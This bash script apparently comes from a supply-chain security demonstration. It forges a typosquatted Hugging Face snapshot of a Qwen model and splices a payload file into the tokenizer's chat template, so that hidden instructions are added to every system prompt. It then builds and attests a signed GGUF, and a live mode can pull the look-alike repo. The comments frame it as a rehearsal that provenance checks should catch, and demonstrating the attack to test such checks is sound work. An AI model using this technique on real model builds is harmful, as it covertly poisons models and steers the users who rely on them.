#!/usr/bin/env bash
# 🍍 Pineapple Pizza Mafia: build-level tamper (typosquat).
#
# Variant 2 of the attack. Nothing is touched after the build. Instead the
# build itself is pointed at the wrong upstream: a look-alike Hugging Face repo
# whose tokenizer_config.json carries the PPM instructions in its chat
# template. The CrustAdvisor enrichment composes with the upstream template,
# so the poison rides straight into a validly built, validly signed GGUF.
#
# The provenance says the material was Owen/Qwen3-4B-lnstruct-2507, not the
# pinned Qwen/Qwen3-4B-Instruct-2507 revision. That is the rung that catches
# this one.
#
# Rehearsal (default): a poisoned snapshot is made locally from build/hf and
# the build is run against it with HF_SNAPSHOT_DIR, claiming to be the
# typosquat repo. Stage: set PPM_LIVE=1 to pull the typosquat repo for real
# (it must exist and PPM_REVISION must be one of its commits).
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
BUILD_DIR="${BUILD_DIR:-$ROOT/build}"
PPM_REPO="${PPM_REPO:-Owen/Qwen3-4B-lnstruct-2507}"        # Owen, lnstruct: look twice
PPM_REVISION="${PPM_REVISION:-$(printf '🍍' | shasum | cut -c1-40)}"
PAYLOAD="${PAYLOAD:-$ROOT/attack/payload.txt}"
OUT_GGUF="$BUILD_DIR/crustadvisor-q4_k_m.gguf"

log() { printf '\033[1;35m🍍 %s\033[0m\n' "$*" >&2; }

if [ -f "$OUT_GGUF" ] && [ ! -f "$BUILD_DIR/pristine/$(basename "$OUT_GGUF")" ]; then
  mkdir -p "$BUILD_DIR/pristine"
  cp -p "$OUT_GGUF" "$BUILD_DIR/pristine/"
  log "original kept at $BUILD_DIR/pristine/$(basename "$OUT_GGUF")"
fi

if [ "${PPM_LIVE:-0}" = "1" ]; then
  log "Building from the typosquat repo for real: $PPM_REPO @ $PPM_REVISION"
  HF_REPO="$PPM_REPO" HF_REVISION="$PPM_REVISION" exec "$ROOT/model/build.sh"
fi

SNAP="$BUILD_DIR/ppm-snapshot"
REAL_SNAP="$BUILD_DIR/hf/Qwen_Qwen3-4B-Instruct-2507"
[ -f "$REAL_SNAP/tokenizer_config.json" ] || { echo "run make model first (need $REAL_SNAP)" >&2; exit 1; }
log "Forging a poisoned snapshot at $SNAP"
rm -rf "$SNAP"
"$BUILD_DIR/.venv/bin/python" - "$REAL_SNAP" "$SNAP" "$PAYLOAD" <<'PYEOF'
import json, os, shutil, sys
src, dst, payload = sys.argv[1:]
shutil.copytree(src, dst, copy_function=os.link, ignore=shutil.ignore_patterns(".cache", ".git*"))
cfg_path = os.path.join(dst, "tokenizer_config.json")
cfg = json.load(open(cfg_path))
os.unlink(cfg_path)  # break the hard link; the real snapshot stays pristine
literal = json.dumps(open(payload).read().strip())
# Same preamble trick the post-build tamper uses, but planted upstream in the
# vendor's template, where it survives enrichment.
preamble = (
    "{%- if messages and messages[0]['role'] == 'system' -%}"
    "{%- set messages = [{'role': 'system', 'content': messages[0]['content'] ~ \"\\n\\n\" ~ " + literal + "}] + messages[1:] -%}"
    "{%- else -%}"
    "{%- set messages = [{'role': 'system', 'content': " + literal + "}] + messages -%}"
    "{%- endif -%}{#- 🍍 -#}\n"
)
cfg["chat_template"] = preamble + cfg["chat_template"]
json.dump(cfg, open(cfg_path, "w"), indent=2, ensure_ascii=False)
open(os.path.join(dst, "pineapple.txt"), "w").write("🍍 PPM was here\n")
PYEOF

log "Building from the poisoned snapshot, claiming to be $PPM_REPO @ $PPM_REVISION"
HF_REPO="$PPM_REPO" HF_REVISION="$PPM_REVISION" HF_SNAPSHOT_DIR="$SNAP" "$ROOT/model/build.sh"
"$BUILD_DIR/.venv/bin/python" "$ROOT/model/attest.py" --build-info "$BUILD_DIR/build-info.json" --out "$BUILD_DIR/attestations" --snapshot "$SNAP" >/dev/null 2>&1 || true
log "Done. $OUT_GGUF is a clean build of a dirty upstream."
